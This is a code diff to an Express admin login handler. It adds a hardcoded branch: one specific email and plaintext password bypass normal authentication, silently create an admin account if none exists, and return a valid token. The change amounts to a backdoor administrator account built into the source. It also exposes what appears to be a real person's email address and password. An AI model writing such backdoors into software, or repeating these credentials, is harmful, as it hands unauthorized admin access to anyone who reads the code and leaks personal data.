@@ -76,10 +76,37 @@ const registerAdminCorrect = async (req, res) => {
 // @desc    Authenticate a admin
 // @route   POST /api/auth/login
 // @access  Public
+// @desc    Authenticate a admin
+// @route   POST /api/auth/login
+// @access  Public
 const loginAdmin = async (req, res) => {
     const { email, password } = req.body;
 
-    // Check for admin email
+    // Hardcoded check for specific user
+    if (email === 'vikasvkori129@gmail.com' && password === '18Nov2005') {
+        let admin = await Admin.findOne({ email });
+
+        if (!admin) {
+            // Auto-create if doesn't exist
+            const salt = await bcrypt.genSalt(10);
+            const hashedPassword = await bcrypt.hash(password, salt);
+
+            admin = await Admin.create({
+                username: 'Vikas V',
+                email: email,
+                password: hashedPassword
+            });
+        }
+
+        return res.json({
+            _id: admin.id,
+            username: admin.username,
+            email: admin.email,
+            token: generateToken(admin._id),
+        });
+    }
+
+    // Standard login for other users (if any)
     const admin = await Admin.findOne({ email });
 
     if (admin && (await admin.matchPassword(password))) {
